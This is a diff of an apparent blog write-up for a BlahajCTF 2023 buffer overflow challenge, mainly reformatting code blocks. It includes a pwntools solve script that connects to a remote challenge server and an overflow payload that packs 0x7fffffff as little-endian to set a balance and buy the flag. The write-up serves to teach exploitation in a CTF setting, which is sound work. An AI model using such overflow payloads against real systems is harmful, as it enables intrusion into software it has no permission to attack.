@@ -12,7 +12,8 @@ categories: BlahajCTF 2023
 This is a simple buffer overflow challenge, with a helpful stack diagram even showing you the layout of the stack itself. The challenge already does a helpful job of explaining the basics of a buffer overflow. The stack diagram thing was cool and helpful. However, it seems that many people were stuck on how to give themselves the $2,147,483,647 (`0x7fffffff`) required to get the flag, since that requires one to input `0x7fffffff` as little-endian.
 
 We can send the `0x7fffffff` input with a pwntools script:
-```py
+
+{% ccb caption:solve.py gutter1:1-11 lang:py %}
 from pwn import *
 # target = process("./guide") # use this for local testing
 target = remote("104.248.97.96", 30001)
@@ -24,10 +25,10 @@ target.sendline(b'2') # shop
 target.recvline()
 target.sendline(b'3') # buy flag
 target.interactive()
-```
+{% endccb %}
 
 Now let's look at our buffer overflow payload:
-{% ccb lang:py gutter1:7 %}
+{% ccb lang:py caption:solve.py gutter1:7 %}
 target.sendline(p64(0x1) + p32(0x1) + p32(0x1) + p32(0x1) + p32(2147483647)) # payload
 {% endccb %}
 
